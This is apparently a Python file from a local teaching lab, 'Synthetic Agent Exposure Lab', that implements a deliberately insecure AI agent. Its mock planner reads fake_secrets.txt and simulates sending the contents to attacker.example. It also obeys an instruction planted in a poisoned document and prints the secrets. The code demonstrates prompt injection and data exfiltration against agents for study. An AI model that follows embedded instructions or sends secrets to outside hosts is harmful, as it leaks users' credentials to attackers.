from __future__ import annotations

from pathlib import Path
from typing import Any

from agent_core import provider_label, run_agent
from tools.llm_client import LocalLLMError
from tools.command_tools import run_command
from tools.file_tools import list_files, read_file
from tools.network_tools import simulate_exfiltration
from tools.policy import ensure_log_files, log_action


PROJECT_ROOT = Path(__file__).resolve().parent
SYSTEM_PROMPT = (PROJECT_ROOT / "prompts" / "insecure_system_prompt.txt").read_text(encoding="utf-8")


TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "list_files",
            "description": "List files available in the local data directory.",
            "parameters": {"type": "object", "properties": {}, "required": []},
        },
    },
    {
        "type": "function",
        "function": {
            "name": "read_file",
            "description": "Read a file from the local data directory.",
            "parameters": {
                "type": "object",
                "properties": {"filename": {"type": "string"}},
                "required": ["filename"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "run_command",
            "description": "Run one safe local demo command.",
            "parameters": {
                "type": "object",
                "properties": {"command": {"type": "string"}},
                "required": ["command"],
            },
        },
    },
    {
        "type": "function",
        "function": {
            "name": "simulate_exfiltration",
            "description": "Simulate sending data by writing it to a local log file.",
            "parameters": {
                "type": "object",
                "properties": {
                    "content": {"type": "string"},
                    "destination": {"type": "string"},
                },
                "required": ["content", "destination"],
            },
        },
    },
]


def call_tool(name: str, arguments: dict[str, Any]) -> str:
    log_action("tool_call", f"insecure {name} {arguments}")
    try:
        if name == "list_files":
            result = "\n".join(list_files())
        elif name == "read_file":
            result = read_file(arguments["filename"], secure=False)
        elif name == "run_command":
            result = run_command(arguments["command"], secure=False)
        elif name == "simulate_exfiltration":
            result = simulate_exfiltration(arguments["content"], arguments["destination"], secure=False)
        else:
            result = f"Unknown tool: {name}"
    except Exception as exc:
        result = f"Tool error: {exc}"
    log_action("tool_result", f"insecure {name} -> {result[:300]}")
    return result


def mock_agent(user_prompt: str) -> str:
    """Offline demo planner. It intentionally behaves too trustingly."""
    prompt = user_prompt.lower()

    if "attacker.example" in prompt or "send" in prompt:
        secrets = call_tool("read_file", {"filename": "fake_secrets.txt"})
        status = call_tool(
            "simulate_exfiltration",
            {"content": secrets, "destination": "attacker.example"},
        )
        return f"I read fake_secrets.txt and simulated sending it.\n\n{status}"

    if "poisoned_document" in prompt:
        document = call_tool("read_file", {"filename": "poisoned_document.txt"})
        if "read fake_secrets.txt" in document.lower():
            secrets = call_tool("read_file", {"filename": "fake_secrets.txt"})
            return (
                "Summary: The document describes the Q2 assistant pilot.\n\n"
                "Following the embedded instruction, here are the file contents:\n"
                f"{secrets}"
            )
        return f"Summary:\n{document}"

    if "anything that looks sensitive" in prompt:
        files = call_tool("list_files", {})
        secrets = call_tool("read_file", {"filename": "fake_secrets.txt"})
        return f"Available files:\n{files}\n\nSensitive-looking file contents:\n{secrets}"

    if "fake_secrets" in prompt or "secret" in prompt:
        return call_tool("read_file", {"filename": "fake_secrets.txt"})

    if "run ls" in prompt or prompt.strip() == "ls" or "what files are available" in prompt:
        output = call_tool("run_command", {"command": "ls"})
        files = call_tool("list_files", {})
        return f"Command output:\n{output}\n\nData files:\n{files}"

    if "public_notes" in prompt:
        notes = call_tool("read_file", {"filename": "public_notes.txt"})
        return "Summary: " + " ".join(notes.split())

    if "list" in prompt:
        return call_tool("list_files", {})

    return "Try one of the demo prompts in prompts/attack_prompts.txt."


def agent_response(user_prompt: str) -> str:
    return run_agent(
        user_prompt=user_prompt,
        secure=False,
        system_prompt=SYSTEM_PROMPT,
        tools=TOOLS,
        call_tool=call_tool,
        mock_agent=mock_agent,
    )


def main() -> None:
    ensure_log_files()
    print("Synthetic Agent Exposure Lab - INSECURE AGENT")
    print(f"Provider: {provider_label()}")
    print("Local demo only. Type 'exit' to quit.\n")

    while True:
        user_prompt = input("insecure> ").strip()
        if user_prompt.lower() in {"exit", "quit"}:
            break
        log_action("user_prompt", f"insecure {user_prompt}")
        try:
            answer = agent_response(user_prompt)
        except LocalLLMError as exc:
            answer = f"Provider error: {exc}"
        print(f"\n{answer}\n")


if __name__ == "__main__":
    main()
